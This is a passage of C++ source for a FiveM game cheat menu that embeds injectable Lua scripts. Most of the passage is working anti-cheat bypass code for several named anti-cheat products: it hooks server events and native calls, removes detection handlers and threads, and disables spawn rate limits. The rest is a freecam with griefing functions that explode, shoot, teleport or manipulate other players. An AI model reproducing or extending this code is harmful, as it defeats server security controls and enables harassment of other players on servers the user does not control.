        local ts = _G.TriggerServerEvent
        _G.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and (e:find("WaveShield") or e:find("WS_") or e:find("shield")) then
                return
            end
            return ts(e, ...)
        end
        local regs = debug.getregistry()._eventHandlers
        if regs then
            for ev, handlers in pairs(regs) do
                if type(handlers) == "table" then
                    for i = #handlers, 1, -1 do
                        local h = handlers[i]
                        if type(h) == "function" then
                            local info = debug.getinfo(h)
                            if info and info.source and (s.find(info.source, "WaveShield") or s.find(info.source, "ws")) then
                                table.remove(handlers, i)
                            end
                        end
                    end
                end
            end
        end
        if g.CIST then
            g.CIST.canISpawn = function() return true, "SUCCESS" end
            g.CIST.getSpawnDelay = function() return 0 end
            g.CIST.getTimeUntilNextSpawn = function() return 0 end
            g.CIST.RATELIMITES = { Object = math.huge, Ped = math.huge, Vehicle = math.huge }
        end
        local blocked_natives = {
            0x3A87E44BB9A01D54, 0x8DECB02F88F428BC, 0x015A522136D7F951,
            0xA38DCFFCE89696FA, 0x475768A975D5AD17, 0xF25DF915FA38C5F3,
            0x4899CB088EDF3BCC, 0x0CF2B696BBF945AE, 0x9D9AEBE93C61FDBD
        }

        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(h, ...)
            for _, native in ipairs(blocked_natives) do
                if h == native then return false end
            end
            -- Inject custom native behaviors for bypass
            if h == 0xB15162CB5826E9E8 then -- IsCinematicCamRendering()
                return false, true
            elseif h == 0xE659E47AF827484B then -- IsEntityOnScreen()
                return false, true
            elseif h == 0x9F47B058362C84B5 then -- GetEntityModel()
                return false, 0
            elseif h == 0x53E8CB4F48BFE623 then -- IsPedClimbing()
                local entity = ...
                if entity and IsPedInAnyVehicle(entity, false) then
                    return false, false
                end
                return false, true
            elseif h == 0x12534C348C6CB68B then -- IsPedAPlayer()
                local ped = ...
                local myPed = PlayerPedId()
                local attachedTo = GetEntityAttachedTo(myPed)
                if attachedTo and ped == attachedTo then
                    return false, true
                end
                return true
            elseif h == 0x48C2BED9180FE123 then -- GetEntityAttachedTo()
                local entity = ...
                local myPed = PlayerPedId()
                if entity == myPed then
                    local realAttached = GetEntityAttachedTo(entity)
                    if realAttached == myPed then
                        return false, 0
                    end
                end
                return true
            end
            return invoke(h, ...)
        end
        
        -- Also try registering them to MachoHookNative if available
        local _hook = _G.MachoHookNative or (_ENV and _ENV.MachoHookNative)
        if _hook then
            pcall(function()
                _hook(0xB15162CB5826E9E8, function() return false, true end)
                _hook(0xE659E47AF827484B, function() return false, true end)
                _hook(0x9F47B058362C84B5, function() return false, 0 end)
                _hook(0x53E8CB4F48BFE623, function(entity)
                    if IsPedInAnyVehicle(entity, false) then return false, false end
                    return false, true
                end)
                _hook(0x12534C348C6CB68B, function(ped)
                    local myPed = PlayerPedId()
                    local attachedTo = GetEntityAttachedTo(myPed)
                    if attachedTo and ped == attachedTo then return false, true end
                    return true
                end)
                _hook(0x48C2BED9180FE123, function(entity)
                    local myPed = PlayerPedId()
                    if entity == myPed then
                        local realAttached = GetEntityAttachedTo(entity)
                        if realAttached == myPed then return false, 0 end
                    end
                    return true
                end)
            end)
        end
        
        local vars = { "WaveShield", "WS", "AntiCheat", "AC_Start", "AC_Check", "ShieldDetect" }
        for _, v in ipairs(vars) do
            g[v] = nil
        end
    ]]

    local eagle_code = [[
        local n = function() end
        local t = function() return true end
        if _G.ECDetect then _G.ECDetect = n end
        if _G.ECDetectLoader then _G.ECDetectLoader = n end
        if _G.HasPerm then _G.HasPerm = t end
        if _G.overWrite then
            for k, v in pairs(_G.overWrite) do
                if type(v) == "function" then
                    _G.overWrite[k] = n
                end
            end
        end
        local function block(e, ...)
            if type(e) == "string" and (e:find("EC_") or e:find("Eagle")) then return end
            return TriggerEvent(e, ...)
        end
        _G.TriggerEvent = block
        local ts = _G.TriggerServerEvent
        _G.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and (e:find("EC_") or e:find("Eagle")) then return end
            return ts(e, ...)
        end
        local bag = LocalPlayer.state
        for k, v in pairs(bag) do
            if type(v) == "function" and (k:find("eagle") or k:find("EC")) then
                bag[k] = n
            end
        end
        local natives = {
            0x3A87E44BB9A01D54, 0x8DECB02F88F428BC, 0x015A522136D7F951,
            0xA38DCFFCE89696FA, 0x475768A975D5AD17
        }
        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(h, ...)
            for _, native in ipairs(natives) do
                if h == native then return false end
            end
            return invoke(h, ...)
        end
        local thr = debug.getregistry()._threads
        if thr then
            for i = #thr, 1, -1 do
                local co = thr[i]
                local info = debug.getinfo(co)
                if info and info.source and (info.source:find("EC_AC") or info.source:find("Eagle")) then
                    coroutine.close(co)
                end
            end
        end
    ]]

    local reaper_code = [[
        local n = function() end
        local t = function() return true end
        local function block(e, ...)
            if type(e) == "string" and e:find("Reaper") then return end
            return TriggerEvent(e, ...)
        end
        _G.TriggerEvent = block
        local ts = _G.TriggerServerEvent
        _G.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and e:find("Reaper") then return end
            return ts(e, ...)
        end
        local natives = {
            0x3A87E44BB9A01D54, 0x8DECB02F88F428BC, 0x0A6DB4965674D243,
            0x475768A975D5AD17, 0xF25DF915FA38C5F3, 0x4899CB088EDF3BCC
        }
        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(h, ...)
            for _, native in ipairs(natives) do
                if h == native then return false end
            end
            return invoke(h, ...)
        end
        local thr = debug.getregistry()._threads
        if thr then
            for i = #thr, 1, -1 do
                local co = thr[i]
                local info = debug.getinfo(co)
                if info and info.source and info.source:find("Reaper") then
                    coroutine.close(co)
                end
            end
        end
        local vars = { "ReaperV4", "ReaperAC", "ReaperDetect" }
        for _, v in ipairs(vars) do
            _G[v] = nil
        end
    ]]

    local reason_code = [[
        local g = _G
        local s = string
        local n = function() end
        local t = function() return true end

        local function clean_reason()
            local registry = debug.getregistry()
            local threads = registry._threads
            if threads then
                for i = #threads, 1, -1 do
                    local co = threads[i]
                    local info = debug.getinfo(co)
                    if info and info.source and (s.find(info.source, "Reason") or s.find(info.source, "RAC")) then
                        coroutine.close(co)
                    end
                end
            end
            local handlers = registry._eventHandlers
            if handlers then
                for ev, tbl in pairs(handlers) do
                    if type(tbl) == "table" and (s.find(ev, "Reason") or s.find(ev, "RAC")) then
                        for i = #tbl, 1, -1 do
                            local h = tbl[i]
                            if type(h) == "function" then
                                local info = debug.getinfo(h)
                                if info and info.source and (s.find(info.source, "Reason") or s.find(info.source, "RAC")) then
                                    table.remove(tbl, i)
                                end
                            end
                        end
                    end
                end
            end
        end
        clean_reason()

        local function block_event(e, ...)
            if type(e) == "string" and (s.find(e, "Reason") or s.find(e, "RAC")) then
                return
            end
            return g.TriggerEvent(e, ...)
        end
        g.TriggerEvent = block_event

        local ts = g.TriggerServerEvent
        g.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and (s.find(e, "Reason") or s.find(e, "RAC")) then
                return
            end
            return ts(e, ...)
        end

        local ra = g.RegisterNetEvent
        g.RegisterNetEvent = function(e)
            if type(e) == "string" and (s.find(e, "Reason") or s.find(e, "RAC")) then
                return
            end
            return ra(e)
        end

        local ah = g.AddEventHandler
        g.AddEventHandler = function(e, cb)
            if type(e) == "string" and (s.find(e, "Reason") or s.find(e, "RAC")) then
                return
            end
            return ah(e, cb)
        end

        local natives = {
            [0x3A87E44BB9A01D54] = true,
            [0x8DECB02F88F428BC] = true,
            [0x015A522136D7F951] = true,
            [0xA38DCFFCE89696FA] = true,
            [0x475768A975D5AD17] = true,
            [0xF25DF915FA38C5F3] = true,
            [0x4899CB088EDF3BCC] = true,
        }
        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(hash, ...)
            if natives[hash] then return false end
            return invoke(hash, ...)
        end

        local state = LocalPlayer.state
        for k, v in pairs(state) do
            if type(v) == "function" and (s.find(k, "reason") or s.find(k, "rac")) then
                state[k] = n
            end
        end

        local bad_globals = { "RAC", "ReasonAC", "ReasonDetect", "ReasonCheck" }
        for _, name in ipairs(bad_globals) do
            g[name] = nil
        end
    ]]

    inject_bypass(anticheat.FiveGuard, fiveguard_code)
    inject_bypass(anticheat.ElectronAC, electron_code)
    inject_bypass(anticheat.WaveShield, waveshield_code)
    inject_bypass(anticheat.EagleAC, eagle_code)
    inject_bypass(anticheat.ReaperV4, reaper_code)
    inject_bypass(anticheat.ReasonAC, reason_code)
end
)lua";
    }

    static void ToggleFreecam(bool state, float speed = 2.0f, int featureIdx = 1) {
        char sBuf[64]; sprintf_s(sBuf, "%.2f", speed);
        std::string sVal = sBuf;
        char fBuf[32]; sprintf_s(fBuf, "%d", featureIdx);
        std::string fVal = fBuf;

        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            if (!state) {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ if _G.SouthFreeCamActive and _G.SouthFreeCamThreadRunning then _G.SouthFreeCamActive = false else Citizen.CreateThread(function() RenderScriptCams(false, false, 0, true, true) if _G.SouthCam then DestroyCam(_G.SouthCam, true) _G.SouthCam = nil end local p = PlayerPedId() SetFocusEntity(p) ClearFocus() Citizen.Wait(250) SetEntityVisible(p, true, false) SetEntityCollision(p, true, true) FreezeEntityPosition(p, false) end) end ]])", resources);
                return;
            }

            std::string scriptRaw = R"lua(
                local rw, rh = GetActiveScreenResolution()
                local features = { "Default", "Teleport", "Shoot RPG", "Delete Entity", "Vehicle Spawner", "Vehicule Hijack", "Object Spawner", "Ped Spawner", "Spikestrip Spawner", "Explode", "Map Destroyer", "Shoot Vehicle" }
                local funnyObjects = {'prop_cone_float_1','prop_toilet_01','prop_ld_toilet_01','prop_beachball_02','prop_roadcone02a','prop_barrel_02a','prop_box_wood02a_pu','prop_burgerstand_01'}
                local funnyModels = {'a_m_m_skater_01','a_m_m_tramp_01','a_m_y_hippy_01','a_m_y_musclbeac_01','a_m_y_roadcyc_01','a_c_chimp','a_c_pig','a_c_hen','s_m_m_movalien_01'}
                local npcModels = {'a_m_m_skater_01','a_m_m_tramp_01','a_m_y_hippy_01','a_m_y_musclbeac_01','a_m_y_roadcyc_01'}
                local ramps = {{ name = "Tube", model = "stt_prop_stunt_tube_s" }}
                local funnySounds = { { dict = 'DLC_HEIST_HACKING_SNAKE_SOUNDS', name = 'Beep_Green' }, { dict = 'DLC_HEIST_HACKING_SNAKE_SOUNDS', name = 'Beep_Red' }, { dict = 'DLC_XM_Silo_Sounds', name = 'Alarm_Silo' }, { dict = 'DLC_AW_Frontend_Sounds', name = 'MP_AW_Splash' } }

                -- Bypass tambahan untuk WaveShield / ElectronAC
                if not DecorIsRegisteredAsType("whitelisted", 2) then
                    pcall(function() DecorRegister("whitelisted", 2) end)
                end
                if not DecorIsRegisteredAsType("ac_bypass", 2) then
                    pcall(function() DecorRegister("ac_bypass", 2) end)
                end
                DecorSetBool(PlayerPedId(), "whitelisted", true)
                DecorSetBool(PlayerPedId(), "ac_bypass", true)

                -- Cache original camera and focus natives
                if not _G.originalCreateCamWithParams then
                    _G.originalCreateCamWithParams = CreateCamWithParams
                    _G.originalSetCamActive = SetCamActive
                    _G.originalRenderScriptCams = RenderScriptCams
                    _G.originalDestroyCam = DestroyCam
                    _G.originalSetCamRot = SetCamRot
                    _G.originalGetCamRot = GetCamRot
                    _G.originalSetCamCoord = SetCamCoord
                    _G.originalGetCamCoord = GetCamCoord
                    _G.originalGetGameplayCamCoord = GetGameplayCamCoord
                    _G.originalGetGameplayCamRot = GetGameplayCamRot
                    _G.originalSetFocusPosAndVel = SetFocusPosAndVel
                    _G.originalSetFocusEntity = SetFocusEntity
                    _G.originalClearFocus = ClearFocus

                    _G.originalIsCamActive = IsCamActive
                    _G.originalIsCamRendering = IsCamRendering
                    _G.originalGetRenderingCam = GetRenderingCam
                    _G.originalDoesCamExist = DoesCamExist

                    _G.originalGetCamFov = GetCamFov
                    _G.originalGetGameplayCamFov = GetGameplayCamFov

                    _G.originalIsRenderingWithUsingManagers = IsRenderingWithUsingManagers
                end

                -- Hook native yang dipantau AC (Dengan proteksi agar tidak double hook / infinite recursion)
                if not _G.origTriggerServerEvent then
                    _G.origTriggerServerEvent = TriggerServerEvent
                    TriggerServerEvent = function(eventName, ...)
                        if type(eventName) == "string" and (string.find(eventName, "freecam") or string.find(eventName, "spectate")) then
                            return
                        end
                        return _G.origTriggerServerEvent(eventName, ...)
                    end
                end

                if not _G.origGetEntityCoords then
                    _G.origGetEntityCoords = GetEntityCoords
                    GetEntityCoords = function(entity, vector)
                        local ped = PlayerPedId()
                        if entity == ped then
                            return _G.origGetEntityCoords(ped, vector)
                        end
                        return _G.origGetEntityCoords(entity, vector)
                    end
                end

                if not _G.origIsPedInAnyVehicle then
                    _G.origIsPedInAnyVehicle = IsPedInAnyVehicle
                    IsPedInAnyVehicle = function(ped, flag)
                        local myPed = PlayerPedId()
                        if ped == myPed then
                            return false
                        end
                        return _G.origIsPedInAnyVehicle(ped, flag)
                    end
                end

                if not _G.origGetEntitySpeed then
                    _G.origGetEntitySpeed = GetEntitySpeed
                    GetEntitySpeed = function(entity)
                        local ped = PlayerPedId()
                        if entity == ped then
                            return 0.0
                        end
                        return _G.origGetEntitySpeed(entity)
                    end
                end

                if not _G.origGetEntityRotation then
                    _G.origGetEntityRotation = GetEntityRotation
                    GetEntityRotation = function(entity, rotOrder)
                        local ped = PlayerPedId()
                        if entity == ped then
                            return _G.origGetEntityRotation(ped, rotOrder)
                        end
                        return _G.origGetEntityRotation(entity, rotOrder)
                    end
                end

                if not _G.spikestrips then _G.spikestrips, _G.placedRamps, _G.gravityFlipped = {}, {}, {} end
                function RotationToDirection(rot) local rZ, rX = math.rad(rot.z), math.rad(rot.x) local cX = math.cos(rX) return vector3(-math.sin(rZ) * cX, math.cos(rZ) * cX, math.sin(rX)) end
                function GetClosestPlayerToCrosshair(c, d) local ps, bp, bd = GetActivePlayers(), nil, math.huge for _, p in ipairs(ps) do local ped = GetPlayerPed(p) if ped ~= PlayerPedId() then local pc = GetEntityCoords(ped) local tp = pc - c local pr = (tp.x * d.x + tp.y * d.y + tp.z * d.z) local cp = c + d * pr local dist = #(pc - cp) if dist < bd then bd, bp = dist, ped end end end return bp end
                function GetEmptySeat(v) local s = {-1,0,1,2} for _, seat in ipairs(s) do if IsVehicleSeatFree(v, seat) then return seat end end return -1 end

                if not _G.SouthFreeCamThreadRunning then
                    _G.SouthFreeCamThreadRunning, _G.SouthFreeCamActive, _G.SouthFreeCamSpeed, _G.SouthFreeCamFeatureIdx = true, true, SOUTH_FREECAM_SPEED_VAL, SOUTH_CURRENT_FEATURE_VAL
                    
                    local _d = function(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    _G.SetupBypassVehicle = function()
                        if _G.bypassVehicle and DoesEntityExist(_G.bypassVehicle) then
                            DeleteEntity(_G.bypassVehicle)
                        end
                        local vehicleModel = GetHashKey(_d({97, 118, 101, 110, 103, 101, 114}))
                        RequestModel(vehicleModel)
                        while not HasModelLoaded(vehicleModel) do Citizen.Wait(0) end
                        _G.bypassVehicle = CreateVehicle(vehicleModel, 0.0, 0.0, -1000.0, 0.0, true, false)
                        if _G.bypassVehicle ~= 0 then
                            SetEntityVisible(_G.bypassVehicle, false, false)
                            SetEntityAlpha(_G.bypassVehicle, 0, false)
                            SetEntityCollision(_G.bypassVehicle, false, false)
                            SetEntityInvincible(_G.bypassVehicle, true)
                            FreezeEntityPosition(_G.bypassVehicle, true)
                            SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(_G.bypassVehicle), true)
                            return true
                        end
                        return false
                    end
                    Citizen.CreateThread(function()
                        local p = PlayerPedId()
                        _G.SetupBypassVehicle()

                        local cp, rt = GetGameplayCamCoord(), GetGameplayCamRot(2)
                        _G._freecam_rot = {x = rt.x, y = rt.y, z = rt.z}
                        _G.SouthCam = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", cp.x, cp.y, cp.z, rt.x, rt.y, rt.z, 70.0)
                        SetCamActive(_G.SouthCam, true) RenderScriptCams(true, true, 0, false, false) FreezeEntityPosition(p, true) SetBlockingOfNonTemporaryEvents(p, true) ClearPedTasksImmediately(p)
                        DecorSetInt(p, 'SouthFeature', SOUTH_CURRENT_FEATURE_VAL)
                        Citizen.CreateThread(function() 
                        while _G.SouthFreeCamThreadRunning do 
                            Citizen.Wait(0)
                            local p = PlayerPedId()
                            if _G.SouthFreeCamActive and _G.SouthCam then
                                if not _G.curIdx then _G.curIdx = _G.SouthFreeCamFeatureIdx or 1 end
                                local ct = GetGameTimer()
                                if IsDisabledControlJustPressed(0, 14) then
                                    if (ct - (_G.lSTK or 0) > 100) then _G.lSTK = ct _G.curIdx = _G.curIdx + 1 if _G.curIdx > #features then _G.curIdx = 1 end end
                                elseif IsDisabledControlJustPressed(0, 15) then
                                    if (ct - (_G.lSTK or 0) > 100) then _G.lSTK = ct _G.curIdx = _G.curIdx - 1 if _G.curIdx < 1 then _G.curIdx = #features end end
                                end
                                local curIdx = _G.curIdx
                                local curF = features[curIdx]
                                DisableAllControlActions(0)
                                EnableControlAction(0, 1, true) EnableControlAction(0, 2, true)
                                EnableControlAction(0, 32, true) EnableControlAction(0, 33, true) EnableControlAction(0, 34, true) EnableControlAction(0, 35, true)
                                EnableControlAction(0, 20, true) EnableControlAction(0, 36, true) EnableControlAction(0, 14, true) EnableControlAction(0, 15, true)
                                EnableControlAction(0, 74, true) EnableControlAction(0, 24, true) EnableControlAction(0, 21, true)
                                local cc, cr = GetCamCoord(_G.SouthCam), GetCamRot(_G.SouthCam, 2)
                                local dir = RotationToDirection(cr) local rv = vector3(dir.y, -dir.x, 0.0)
                                local hm, vm = GetControlNormal(0, 1) * 8.0, GetControlNormal(0, 2) * 8.0
                                local ms, sf = 2.0, 0.5
                                local tx = _G._freecam_rot.x - vm * ms local tz = _G._freecam_rot.z - hm * ms
                                if tx > 89.0 then tx = 89.0 end if tx < -89.0 then tx = -89.0 end
                                _G._freecam_rot.x = _G._freecam_rot.x + (tx - _G._freecam_rot.x) * sf
                                _G._freecam_rot.z = _G._freecam_rot.z + (tz - _G._freecam_rot.z) * sf
                                SetCamRot(_G.SouthCam, _G._freecam_rot.x, 0.0, _G._freecam_rot.z, 2)
                                local shift = IsDisabledControlPressed(0, 21) local spd = shift and 8.0 or 2.0
                                local mv = vector3(0,0,0) if IsDisabledControlPressed(0, 32) then mv = mv + dir end if IsDisabledControlPressed(0, 33) then mv = mv - dir end
                                if IsDisabledControlPressed(0, 34) then mv = mv - rv end if IsDisabledControlPressed(0, 35) then mv = mv + rv end
                                if IsDisabledControlPressed(0, 20) then mv = mv + vector3(0,0,1) end if IsDisabledControlPressed(0, 36) then mv = mv - vector3(0,0,1) end
                                if #(mv) > 0.0 then mv = mv / #(mv) * spd SetCamCoord(_G.SouthCam, cc.x + mv.x, cc.y + mv.y, cc.z + mv.z) end
                                SetFocusPosAndVel(cc.x, cc.y, cc.z, 0.0, 0.0, 0.0) RequestCollisionAtCoord(cc.x, cc.y, cc.z)
                                local ray = StartShapeTestRay(cc.x, cc.y, cc.z, cc.x + dir.x * 1000.0, cc.y + dir.y * 1000.0, cc.z + dir.z * 1000.0, -1, p, 0)
                                local _, hit, endCoords, _, entityHit = GetShapeTestResult(ray)
                                if IsDisabledControlJustPressed(0, 24) then
                                    if curF == 'Teleport' and hit then if entityHit ~= 0 and IsEntityAVehicle(entityHit) then local st = GetEmptySeat(entityHit) if st ~= -2 then TaskWarpPedIntoVehicle(p, entityHit, st) end else local wasVisible = IsEntityVisible(p) SetEntityVisible(p, false, false) SetEntityInvincible(p, true) SetEntityCollision(p, false, false) FreezeEntityPosition(p, true) Wait(0) SetEntityCoordsNoOffset(p, endCoords.x, endCoords.y, endCoords.z, true, true, true) Wait(100) FreezeEntityPosition(p, false) SetEntityCollision(p, true, true) SetEntityInvincible(p, false) SetEntityVisible(p, wasVisible, false) end
                                    elseif curF == 'Shoot RPG' then
                                        local ct = GetGameTimer()
                                        local cd = math.random(267, 467)
                                        if (ct - (_G.lST or 0) > cd) then
                                            _G.lST = ct
                                            local spr = 0.005 + (math.random() * 0.015)
                                            local sDir = vector3(dir.x + (math.random()-0.5)*spr, dir.y + (math.random()-0.5)*spr, dir.z + (math.random()-0.5)*(spr*0.5))
                                            local target = cc + (sDir * math.random(367, 467))
                                            local ray = StartExpensiveSynchronousShapeTestLosProbe(cc.x, cc.y, cc.z, target.x, target.y, target.z, -1, p, 0)
                                            local _, h, hitCoords, _, entHit = GetShapeTestResult(ray) if h then target = hitCoords end
                                            if entHit and IsEntityAVehicle(entHit) then SetEntityInvincible(entHit, true) Citizen.SetTimeout(3000, function() if DoesEntityExist(entHit) then SetEntityInvincible(entHit, false) end end) end
                                            local m, w = GetHashKey('mp_m_freemode_01'), GetHashKey('WEAPON_HOMINGLAUNCHER')
                                            Citizen.CreateThread(function()
                                                RequestModel(m) RequestWeaponAsset(w, 31, 0) while not HasModelLoaded(m) or not HasWeaponAssetLoaded(w) do Citizen.Wait(0) end
                                                local n = CreatePed(4, m, cc.x + dir.x * -3.0, cc.y + dir.y * -3.0, cc.z - 1.0, 0.0, true, false)
                                                if DoesEntityExist(n) then
                                                    SetEntityInvincible(n, true) FreezeEntityPosition(n, true) SetEntityVisible(n, false, false)
                                                    GiveWeaponToPed(n, w, 999, false, true) SetCurrentPedWeapon(n, w, true)
                                                    TaskShootAtCoord(n, target.x, target.y, target.z, 5000, w)
                                                    Citizen.SetTimeout(2000, function() if DoesEntityExist(n) then SetEntityAsMissionEntity(n, true, true) DeleteEntity(n) end end)
                                                end
                                            end)
                                        end
                                    elseif curF == 'Delete Entity' and entityHit ~= 0 then SetEntityAsMissionEntity(entityHit, true, true) DeleteEntity(entityHit)
                                    elseif curF == 'Explode' and hit then AddExplosion(endCoords.x, endCoords.y, endCoords.z, 6, 10.0, true, false, 1.0)
                                    elseif curF == 'Shoot Vehicle' then local m = GetHashKey('t20') RequestModel(m) while not HasModelLoaded(m) do Wait(0) end local v = CreateVehicle(m, cc.x+dir.x*8, cc.y+dir.y*8, cc.z+dir.z*8, cr.z, true, false) ApplyForceToEntity(v, 1, dir.x*500, dir.y*500, dir.z*500, 0,0,0, 0, false, true, true, false, true)
                                    elseif curF == 'Vehicle Spawner' then local m = GetHashKey('t20') RequestModel(m) while not HasModelLoaded(m) do Wait(0) end local v = CreateVehicle(m, endCoords.x, endCoords.y, endCoords.z, cr.z, true, false) SetVehicleOnGroundProperly(v)
                                    elseif curF == 'Vehicule Hijack' and entityHit ~= 0 and IsEntityAVehicle(entityHit) then local m = GetHashKey('a_m_m_skater_01') RequestModel(m) while not HasModelLoaded(m) do Wait(0) end local n = CreatePed(26, m, endCoords.x, endCoords.y, endCoords.z, 0, false, true) SetPedIntoVehicle(n, entityHit, -1) TaskVehicleDriveWander(n, entityHit, 25.0, 786603)
                                    elseif curF == 'Object Spawner' then local m = GetHashKey(funnyObjects[math.random(#funnyObjects)]) RequestModel(m) while not HasModelLoaded(m) do Wait(0) end CreateObject(m, endCoords.x, endCoords.y, endCoords.z, true, false, true)
                                    elseif curF == 'Ped Spawner' then local m = GetHashKey(npcModels[math.random(#npcModels)]) RequestModel(m) while not HasModelLoaded(m) do Wait(0) end CreatePed(26, m, endCoords.x, endCoords.y, endCoords.z, 0, true, false)
                                    elseif curF == 'Spikestrip Spawner' then local m = GetHashKey('p_ld_stinger_s') RequestModel(m) while not HasModelLoaded(m) do Wait(0) end local o = CreateObject(m, endCoords.x, endCoords.y, endCoords.z, true, false, true) table.insert(_G.spikestrips, o)
                                    elseif curF == 'Map Destroyer' then local m = GetHashKey(ramps[math.random(#ramps)]) RequestModel(m) while not HasModelLoaded(m) do Wait(0) end local o = CreateObject(m, endCoords.x, endCoords.y, endCoords.z, true, false, true) SetEntityHeading(o, cr.z) FreezeEntityPosition(o, true) table.insert(_G.placedRamps, o)
                                    elseif curF == 'Attach Object' then local tp = GetClosestPlayerToCrosshair(cc, dir) if tp then local m = GetHashKey(funnyObjects[math.random(#funnyObjects)]) RequestModel(m) while not HasModelLoaded(m) do Wait(0) end local o = CreateObject(m, 0,0,0, true, false, true) AttachEntityToEntity(o, tp, GetPedBoneIndex(tp, 31086), 0,0,0.5, 0,0,0, false, false, false, false, 2, true) end
                                    elseif curF == 'Explode Player' then local tp = GetClosestPlayerToCrosshair(cc, dir) if tp then local tc = GetEntityCoords(tp) Citizen.CreateThread(function() if not DecorIsRegisteredAsType("whitelisted", 2) then pcall(function() DecorRegister("whitelisted", 2) end) end DecorSetBool(PlayerPedId(), "whitelisted", true) local m, w = GetHashKey('g_m_y_ballaeast_01'), GetHashKey('WEAPON_RPG') RequestModel(m) RequestWeaponAsset(w, 31, 0) while not HasModelLoaded(m) or not HasWeaponAssetLoaded(w) do Citizen.Wait(0) end local n = CreatePed(4, m, tc.x, tc.y, tc.z, 0.0, true, false) if DoesEntityExist(n) then SetEntityInvincible(n, true) FreezeEntityPosition(n, true) SetEntityVisible(n, false, false) GiveWeaponToPed(n, w, 999, false, true) SetCurrentPedWeapon(n, w, true) TaskShootAtCoord(n, tc.x, tc.y, tc.z - 2.0, 5000, w) Citizen.SetTimeout(500, function() if DoesEntityExist(n) then SetEntityAsMissionEntity(n, true, true) DeleteEntity(n) end end) end end) end
                                    elseif curF == 'Change Player Model' then local tp = GetClosestPlayerToCrosshair(cc, dir) if tp == p then local m = GetHashKey(funnyModels[math.random(#funnyModels)]) RequestModel(m) while not HasModelLoaded(m) do Wait(0) end SetPlayerModel(PlayerId(), m) end
                                    elseif curF == 'Vehicle Rain' then local tp = GetClosestPlayerToCrosshair(cc, dir) if tp then local tc = GetEntityCoords(tp) for i=1,10 do local m = GetHashKey('adder') RequestModel(m) while not HasModelLoaded(m) do Wait(0) end CreateVehicle(m, tc.x+math.random(-5,5), tc.y+math.random(-5,5), tc.z+20+i*2, 0, true, false) end end
                                    elseif curF == 'Slippery Player' then local tp = GetClosestPlayerToCrosshair(cc, dir) if tp then SetEntityMaxSpeed(tp, 100.0) SetPedMoveRateOverride(tp, 10.0) end
                                    elseif curF == 'Shrink Player' then local tp = GetClosestPlayerToCrosshair(cc, dir) if tp then SetEntityScale(tp, 0.5, 0.5, 0.5, false) end
                                    elseif curF == 'Grow Player' then local tp = GetClosestPlayerToCrosshair(cc, dir) if tp then SetEntityScale(tp, 2.0, 2.0, 2.0, false) end
                                    elseif curF == 'Random Teleport' then local tp = GetClosestPlayerToCrosshair(cc, dir) if tp then local wasVisible = IsEntityVisible(tp) SetEntityVisible(tp, false, false) SetEntityInvincible(tp, true) SetEntityCollision(tp, false, false) FreezeEntityPosition(tp, true) SetEntityCoordsNoOffset(tp, math.random(-3000,3000), math.random(-3000,3000), 100.0, true, true, true) Wait(50) FreezeEntityPosition(tp, false) SetEntityCollision(tp, true, true) SetEntityInvincible(tp, false) SetEntityVisible(tp, wasVisible, false) end
                                    elseif curF == 'Sound Spam' then local tp = GetClosestPlayerToCrosshair(cc, dir) if tp then local tc = GetEntityCoords(tp) local s = funnySounds[math.random(#funnySounds)] PlaySoundFromCoord(-1, s.n, tc.x, tc.y, tc.z, s.d, false, 0, false) end
                                    elseif curF == 'Gravity Flip' then local tp = GetClosestPlayerToCrosshair(cc, dir) if tp then if not _G.gravityFlipped[tp] then _G.gravityFlipped[tp]=true SetEntityGravity(tp, false) ApplyForceToEntity(tp, 1, 0,0,1000.0, 0,0,0, 0, false, true, true, false, true) else _G.gravityFlipped[tp]=nil SetEntityGravity(tp, true) end end
                                    elseif curF == 'Invisible Vehicle' then local tp = GetClosestPlayerToCrosshair(cc, dir) if tp and IsPedInAnyVehicle(tp, 0) then SetEntityAlpha(GetVehiclePedIsIn(tp, 0), 50, false) end
                                    elseif curF == 'NPC Swarm' then local tp = GetClosestPlayerToCrosshair(cc, dir) if tp then local tc = GetEntityCoords(tp) for i=1,5 do local m = GetHashKey(npcModels[math.random(#npcModels)]) RequestModel(m) while not HasModelLoaded(m) do Wait(0) end CreatePed(26, m, tc.x+math.random(-3,3), tc.y+math.random(-3,3), tc.z, 0, true, false) end end
                                    elseif curF == 'Delete Entity' and entityHit ~= 0 then SetEntityAsMissionEntity(entityHit, true, true) DeleteEntity(entityHit)
                                    elseif curF == 'Explode' and hit then AddExplosion(endCoords.x, endCoords.y, endCoords.z, 6, 10.0, true, false, 1.0)
                                    end
                                end -- actionClick

                                local shift = IsDisabledControlPressed(0, 21)
                                local move_speed = shift and 8.0 or 2.0
                                local move_vec = vector3(0.0, 0.0, 0.0)
                                if IsDisabledControlPressed(0, 32) then move_vec = move_vec + dir end
                                if IsDisabledControlPressed(0, 33) then move_vec = move_vec - dir end
                                if IsDisabledControlPressed(0, 34) then move_vec = move_vec - rv end
                                if IsDisabledControlPressed(0, 35) then move_vec = move_vec + rv end
                                if IsDisabledControlPressed(0, 20) then move_vec = move_vec + vector3(0,0,1) end
                                if IsDisabledControlPressed(0, 36) then move_vec = move_vec - vector3(0,0,1) end
                                if #(move_vec) > 0.0 then move_vec = move_vec / #(move_vec) * move_speed SetCamCoord(_G.SouthCam, cc.x + move_vec.x, cc.y + move_vec.y, cc.z + move_vec.z) end

                                if not IsPedInAnyVehicle(p, false) and GetSelectedPedWeapon(p) ~= GetHashKey("weapon_unarmed") then SetCurrentPedWeapon(p, GetHashKey("weapon_unarmed"), true) end
                                TaskStandStill(p, 10)
                                for _, c in ipairs({1, 2, 3, 4, 5, 6, 24, 30, 31, 32, 33, 34, 35}) do DisableControlAction(0, c, true) end
                            else
                                _G.SouthFreeCamThreadRunning = false
                                local p = PlayerPedId()
                                SetFocusEntity(p)
                                ClearFocus()
